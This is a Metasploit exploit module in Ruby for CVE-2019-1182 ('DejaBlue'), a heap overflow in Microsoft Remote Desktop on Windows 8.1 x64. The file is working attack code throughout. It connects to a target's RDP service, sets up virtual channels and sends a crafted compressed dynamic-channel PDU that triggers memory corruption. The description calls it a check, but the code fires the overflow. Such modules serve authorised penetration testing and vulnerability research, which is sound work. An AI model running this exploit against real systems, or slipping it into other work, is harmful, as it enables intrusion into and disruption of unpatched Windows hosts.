##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::RDP

  Rank = ManualRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2019-1182 DejaBlue Microsoft Remote Desktop RCE',
      'Description'    => %q{
        This module checks a range of hosts for the CVE-2019-1182 vulnerability.
      },
      'Author'         =>
        [
          'MalwareTech',      # vulnerability research
          'Spencer McIntyre', # module
        ],
      'References'     =>
        [
          [ 'CVE', '2019-1182' ],
          [ 'URL', 'https://www.malwaretech.com/2019/08/dejablue-analyzing-a-rdp-heap-overflow.html' ],
          [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1182']
        ],
      'DisclosureDate' => '2019-08-13',
      'License'        => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
          'WfsDelay' => 5,
          'RDP_CLIENT_NAME' => 'ethdev',
        },
      'Privileged' => true,
      'Payload' =>
        {
          'Space' => 1024,
          'EncoderType' => Msf::Encoder::Type::Raw,
        },
      'Platform' => 'win',
      'Targets' =>
        [
          [
            'Windows 8.1 x64',
            {
              'Arch' => [ARCH_X64],
              'Channel' => 0x0b
            },
          ],
        ],
      'DefaultTarget' => 0,
      'Notes' =>
        {
          'AKA' => ['DejaBlue']
        }
    ))
  end

  def exploit
    begin
      rdp_connect
    rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError
      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')
    end

    is_rdp, server_selected_proto = rdp_check_protocol
    unless is_rdp
      fail_with(Msf::Module::Failure::Unreachable, 'Unable to connect to RDP service')
    end

    # We don't currently support NLA in the mixin or the exploit. However, if we have valid creds, NLA shouldn't stop us
    # from exploiting the target.
    if [RDPConstants::PROTOCOL_HYBRID, RDPConstants::PROTOCOL_HYBRID_EX].include?(server_selected_proto)
      fail_with(Msf::Module::Failure::BadConfig, 'Server requires NLA (CredSSP) security which mitigates this vulnerability.')
    end

    channels = [
      { :name => 'cliprdr',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP | RDPConstants::CHAN_COMPRESS_RDP | RDPConstants::CHAN_SHOW_PROTOCOL,
      },
      { :name => 'drdynvc',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'rdpsnd',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'snddbg',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP,
      },
      { :name => 'rdpdr',
        :options => RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_COMPRESS_RDP,
      },
    ]

    unless rdp_negotiate_security(channels, server_selected_proto)
      fail_with(Msf::Module::Failure::Unknown, 'Negotiation of security failed.')
    end

    rdp_establish_session

    rdp_dispatch_loop

    trigger_overflow

  end

private

  def rdp_on_channel_receive(pkt, chan_user_id, chan_id, flags, dynvc_pdu)
    if chan_id == @channel_ids['drdynvc']
      @dynamic_channel_ids = {} if @dynamic_channel_ids.nil?
      @dynamic_channel_names = {} if @dynamic_channel_names.nil?
      dynvc_pdu = rdp_parse_dynvc_pdu(dynvc_pdu)

      cmd = dynvc_pdu[:cmd_name]
      channel_id = dynvc_pdu[:channel]
      channel_name = @dynamic_channel_names[channel_id]

      case cmd
      when 'CAPABILITIES'
        print_status('Responding to capabilities')

        payload = build_virtual_channel_pdu(0x03, [0b0101_00_00, 0].pack("CC") + "\x03\x00" + "\x33\x33" + "\x11\x11" + "\x3d\x0a" + "\xa7\x04")
        rdp_send(rdp_build_pkt(payload, 'drdynvc'))
      when 'CLOSE'
        print_status("Closing channel: #{channel_name}")
        @dynamic_channel_ids.delete(channel_name)
        @dynamic_channel_names.delete(channel_id)
      when 'CREATE'
        channel_name = dynvc_pdu[:data][0..-2]
        print_status('Responding to create channel request for ' + channel_name)
        @dynamic_channel_ids[channel_name] = channel_id
        @dynamic_channel_names[channel_id] = channel_name

        payload = build_virtual_channel_pdu(0x03, [0b0001_00_00, channel_id, 0].pack("CCN"))
        rdp_send(rdp_build_pkt(payload, 'drdynvc'))
      when 'DATA'
        print_status("Received #{dynvc_pdu[:data].length} bytes of data on channel #{channel_name}")
        rdp_on_dynvc_receive(channel_id, channel_name, dynvc_pdu[:data])
      else
        print_status("DYNVC data received command: #{cmd.ljust(21, ' ')} channel: #{channel_id}")
      end

      return
    end

    super
  end

  def rdp_on_dynvc_receive(channel_id, channel_name, data)
    payload = nil

    case channel_name
    when 'ECHO'
      payload = build_virtual_channel_pdu(0x03, [0b0011_00_00, channel_id].pack("CC") + data)
    end

    rdp_send(rdp_build_pkt(payload, 'drdynvc')) unless payload.nil?
  end

  def rdpdr_client_device_list_announce_request(pkt, chan_user_id, chan_id, flags, data)
    super

    trigger_overflow
  end

  def rdp_send_drdynvc_pdu(data)
    payload = build_virtual_channel_pdu(0x03, data)
    rdp_send(rdp_build_pkt(payload, 'drdynvc'))
  end

  # see [MS-RDPEGFX] section 2.2.5.2
  def build_rdp_data_segment(data)
    # RDP_DATA_SEGMENT
    encoded = [data.length + 1].pack("L<")
    encoded << "\x04"
    encoded << data
  end

  def trigger_overflow
    channel_id = target['Channel']

    # see [MS-RDPEGFX] section 2.2.5
    rdp_data_segment = build_rdp_data_segment(("\x41" * 0x50) + [0xdead1337dead1337].pack('Q'))
    rdp_segmented_data = [0xe1, 1, 0x40 - 0x2000].pack("CS<l<") + rdp_data_segment
    print_status('=== Triggering overwrite ===')

    # see [MS-RDPEDYC]:25 (DYNVC_DATA_COMPRESSED)
    # 0b0111 - cmd  (0x07 data compressed)
    # 0b00   - cbid (0x00 channel is field is 1 byte)
    # 0b00   - sp   (0x00 unused, should be 0x00)
    payload = build_virtual_channel_pdu(0x03, [0b0111_00_00, channel_id].pack('CC') + rdp_segmented_data)
    rdp_send(rdp_build_pkt(payload, 'drdynvc'))
  end

end
